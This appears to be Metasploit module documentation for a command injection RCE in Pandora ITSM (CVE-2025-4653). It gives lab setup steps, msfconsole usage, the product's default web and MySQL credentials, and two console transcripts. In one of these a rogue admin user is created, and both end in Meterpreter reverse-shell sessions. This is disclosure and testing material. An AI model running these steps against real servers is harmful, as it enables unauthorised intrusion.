## Vulnerable Application
Pandora ITSM is a platform for Service Management & Support including a Helpdesk for support
and customer service teams, aligned with ITIL processes.
This module exploits a command injection vulnerability in the `name` backup setting at the
application setup page of Pandora ITSM. This can be triggered by generating a backup with a
malicious payload injected at the `name` parameter.
You need to have admin access at the Pandora ITSM  Web application in order to execute this RCE.
This access can be achieved by knowing the admin credentials to access the web application or
leveraging a default password vulnerability in Pandora ITSM that allows an attacker to access
the Pandora FMS ITSM database, create a new admin user and gain administrative access to the
Pandora ITSM Web application. This attack can be remotely executed over the WAN as long as the
MySQL services are exposed to the outside world.
This issue affects all ITSM Enterprise editions up to `5.0.105` and is patched at `5.0.106`.

The following releases were tested.

**Pandora ITSM Releases:**
* Pandora ITSM Enterprise Edition 5.0.104 Build 240802 MR97 on Ubuntu 22.04
* Pandora ITSM Enterprise Edition 5.0.105 Build 250129 MR98 on Ubuntu 22.04

## Installation steps to install Pandora ITSM Enterprise Edition on Ubuntu 22.04
* Install your favorite virtualization engine (VMware or VirtualBox) on your preferred platform.
* Here are the installation instructions for [VirtualBox on MacOS](https://tecadmin.net/how-to-install-virtualbox-on-macos/).
* Register for a free trial [here](https://pandorafms.com/en/itsm/free-trial/).
* Install a plain Ubuntu 22.04 VM image.
* Log in at the Ubuntu VM with root.
* Run `apt update && apt upgrade` to get the latest updates.
* Run the following command `curl -SsL https://pfms.me/deploy-pandora-itsm > deploy-pandora-itsm`.
* Check the file `deploy-pandora-itsm` and find the `install_script` variable that refers to `itsm_deploy_enterprise_ubuntu_2204.sh`.
* `install_script='https://packages.pandorafms.com/projects/deploy/itsm/iBxbqHhtHkOnzp1rINvG/itsm_deploy_enterprise_ubuntu_2204.sh'`
* Use the `url` and download the file with `curl` and store it locally in the file `install.sh`.
* `curl -LSs https://packages.pandorafms.com/projects/deploy/itsm/iBxbqHhtHkOnzp1rINvG/itsm_deploy_enterprise_ubuntu_2204.sh > install.sh`
* Edit `install.sh` with your favorite editor and change the following line FROM:
* INTEGRIA_PACKAGE_ENT="https://packages.pandorafms.com/c5553382c7268ea9d69dd2f889029162/latest/PandoraITSM_enterprise-latest.tar.gz"
* TO
* INTEGRIA_PACKAGE_ENT="https://packages.pandorafms.com/c5553382c7268ea9d69dd2f889029162/LTS/PandoraITSM_enterprise-lts.tar.gz"
* Run `chmod +x install.sh` and execute the script `./install.sh`.
* After successful installation of Pandora ITSM you can access the application using the `webui` via `http://your_ip/pandoraitsm`.

You are now ready to test the module.

## Verification Steps
- [ ] Start `msfconsole`
- [ ] `use exploit/linux/http/pandora_itsm_auth_rce_cve_2025_4653`
- [ ] `set rhosts <ip-target>`
- [ ] `set rport <port>`
- [ ] `set lhost <attacker-ip>`
- [ ] `set target <0=Unix/Linux Command>`
- [ ] `exploit`
- [ ] you should get a `reverse shell` or `Meterpreter` session depending on the `payload` and `target` settings

## Options

### USERNAME
This option is optional and is the username (default: admin) to authenticate with the Pandora ITSM application.

### PASSWORD
This option is optional and is the password (default: integria) in plain text to authenticate with the Pandora ITSM application.

### DB_USER
This option is required and is the username (default: pandoraitsm) to authenticate with the Pandora ITSM MySQL database.

### DB_PASSWORD
This option is required and is the password (default: P4ndor4.itsm) in plain text to authenticate with the Pandora ITSM MySQL database.

### DB_PORT
This option is required and is the MySQL database port (default: 3306) to connect to the database.

## Scenarios
### Pandora ITSM 5.0.104 on Ubuntu 22.04 -  Unix/Linux Command target
Attack scenario: use the default admin credentials (admin:integria) of the Pandora ITSM application
to gain the privileges for the RCE.
```msf
msf6 exploit(linux/http/pandora_itsm_auth_rce_cve_2025_4653) > rexploit
[*] Reloading module...
[*] Started reverse TCP handler on 192.168.201.10:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Pandora ITSM Enterprise Edition 5.0.104 Build 240802 MR97
[*] Trying to log in with admin credentials admin:integria at the Pandora ITSM Web application.
[*] Succesfully authenticated at the Pandora ITSM Web application.
[*] Saving admin credentials at the msf database.
[*] Executing Unix/Linux Command for cmd/linux/http/x64/meterpreter/reverse_tcp
[*] Sending stage (3090404 bytes) to 192.168.201.6
[*] Meterpreter session 45 opened (192.168.201.10:4444 -> 192.168.201.6:37374) at 2025-07-19 10:21:00 +0000

meterpreter > getuid
Server username: www-data
meterpreter > sysinfo
Computer     : 192.168.201.6
OS           : Ubuntu 22.04 (Linux 5.15.0-144-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > pwd
/var/www/html/pandoraitsm
meterpreter >
```
### Pandora ITSM 5.0.104 on Ubuntu 22.04 -  Unix/Linux Command target
Attack scenario: use the default database credentials (pandoraitsm:P4ndor4.itsm) to create an admin user in the application
to gain the privileges for the RCE.
```msf
msf6 exploit(linux/http/pandora_itsm_auth_rce_cve_2025_4653) > rexploit
[*] Reloading module...
[*] Started reverse TCP handler on 192.168.201.10:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Pandora ITSM Enterprise Edition 5.0.104 Build 240802 MR97
[*] Trying to log in with admin credentials admin:xxx at the Pandora ITSM Web application.
[*] Logging in with admin credentials failed. Trying to connect to the Pandora MySQL server.
[*] Creating new admin user with credentials hhmxr:YGMWzFjE9R for access at the Pandora ITSM Web application.
[*] Trying to log in with new admin credentials hhmxr:YGMWzFjE9R at the Pandora ITSM Web application.
[*] Succesfully authenticated at the Pandora ITSM Web application.
[*] Saving admin credentials at the msf database.
[*] Executing Unix/Linux Command for cmd/linux/http/x64/meterpreter/reverse_tcp
[*] Sending stage (3090404 bytes) to 192.168.201.6
[*] Meterpreter session 46 opened (192.168.201.10:4444 -> 192.168.201.6:38870) at 2025-07-19 10:22:43 +0000

meterpreter > getuid
Server username: www-data
meterpreter > sysinfo
Computer     : 192.168.201.6
OS           : Ubuntu 22.04 (Linux 5.15.0-144-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > pwd
/var/www/html/pandoraitsm
meterpreter >
```

## Limitations
None.
